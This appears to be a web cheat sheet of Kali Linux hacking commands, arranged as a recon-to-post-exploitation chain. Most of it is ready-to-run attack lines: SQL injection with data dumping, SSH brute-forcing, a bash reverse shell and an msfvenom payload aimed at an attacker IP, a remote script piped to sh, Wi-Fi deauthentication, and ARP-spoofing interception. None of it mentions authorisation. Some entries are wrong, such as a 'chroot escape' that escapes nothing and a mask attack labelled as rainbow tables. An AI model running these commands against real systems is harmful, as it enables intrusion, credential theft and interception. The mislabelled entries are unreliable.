Kali Linux Hacking Commands

Kail linux immediate to expert level hacking command list
Reconnaissance and Information Gathering
Nmap for port scanning and service enumeration: nmap -sS -sV -O -p- -T4 -oA scan target_ip
Stealth SYN scan with version detection, OS fingerprinting, all ports, aggressive timing; outputs to multiple formats.
Masscan for ultra-fast IP/port scanning: masscan -p80,443 10.0.0.0/24 --rate=10000
Scans large ranges quickly; pair with nmap for deeper service details.
Dirb/Gobuster for directory brute-forcing: gobuster dir -u http://target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
Discovers hidden directories/files; use -x php,html,txt for extensions.
Subfinder for subdomain enumeration: subfinder -d target.com -o subdomains.txt
Passive DNS recon; follow with httpx -l subdomains.txt -silent to find live hosts.
dnsenum for DNS reconnaissance: dnsenum target.com
Brute-forces subdomains, zone transfers, and common records.
Vulnerability Scanning
Nikto for web server scanning: nikto -h http://target -o nikto.txt
Checks for outdated software, misconfigs, and common web vulns.
OpenVAS (via gvm): gvm-start; gvm-cli --gmp-username admin --gmp-password admin socket --xml "<create_target><name>Test</name><hosts>target_ip</hosts></create_target>"
Full vuln scanner; setup via gvm-setup first for authenticated scans.
Nuclei for template-based scanning: nuclei -u http://target -t /path/to/nuclei-templates/
Fast, custom vuln detection (e.g., CVE exploits).
Exploitation
Metasploit console: msfconsole -q then use exploit/multi/http/target_module; set RHOSTS target_ip; exploit
Framework for 2000+ exploits; e.g., use exploit/unix/webapp/php_include for file inclusion.
SQLMap for SQL injection: sqlmap -u "http://target/page?id=1" --dbs --batch --risk=3 --level=5
Automates blind/time-based injections; --dump to extract data.
XSStrike for XSS: python3 /usr/bin/xsstrike.py -u "http://target/search?q=test"
Detects and exploits reflected/DOM XSS payloads.
Commix for command injection: commix --url="http://target/page?cmd=test" --level=5
Advanced OS command injection fuzzer/exploiter.
Password Attacks
Hydra for brute-force: hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target_ip
Attacks SSH/FTP/HTTP; use -t 4 for threads.
John the Ripper: john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Cracks hashes; hashcat -m 0 -a 0 hash.txt rockyou.txt for GPU acceleration.
Hashcat rainbow tables: hashcat -m 1000 -a 3 hashes.ntlm
Rule-based attacks on NTLM/MD5/etc.
Post-Exploitation and Privilege Escalation
LinPEAS for Linux priv esc enum: curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
Checks SUID, cron jobs, writable files, kernel exploits.
WinPEAS for Windows: winPEASx64.exe quiet (transfer via wget or SMB).
Enum misconfigs like unquoted paths, weak services.
Generate reverse shell (Bash): bash -i >& /dev/tcp/attacker_ip/4444 0>&1
One-liner; upgrade with python3 -c 'import pty; pty.spawn("/bin/bash")'.
Meterpreter reverse shell via msfvenom: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f elf > shell.elf
Then chmod +x shell.elf; ./shell.elf on target.
Enum4linux for SMB recon: enum4linux -a target_ip
Shares, users, policies on Windows/Samba.
Wireless and Network Attacks
Aircrack-ng suite: airmon-ng start wlan0; airodump-ng wlan0mon; aireplay-ng -0 10 -a BSSID wlan0mon
Monitor mode, capture handshakes, deauth for WPA cracking with aircrack-ng -w rockyou.txt capture.cap.
Bettercap for MITM: bettercap -iface eth0; net.probe on; net.sniff on
ARP spoofing, SSLstrip, etc.; set arp.spoof.targets target_ip; arp.spoof on.
Evasion and Persistence
Proxychains for anonymization: proxychains nmap -sT target_ip
Routes through Tor/SOCKS; edit /etc/proxychains.conf.
Chroot jail escape: echo 'rm /etc/ld.so.preload; echo "" > /etc/ld.so.preload' > /tmp/x; chmod +x /tmp/x; /bin/sh -p /tmp/x
Escapes restricted shells.
These commands scale from basic (nmap -sV target) to expert (custom Metasploit modules, chained exploits). Chain them: recon → scan → exploit → post-exploit. Always verify with --dry-run equivalents where available, and adapt payloads to target OS/version. For custom needs, pipe to tee for logging: nmap ... | tee scan.nmap.





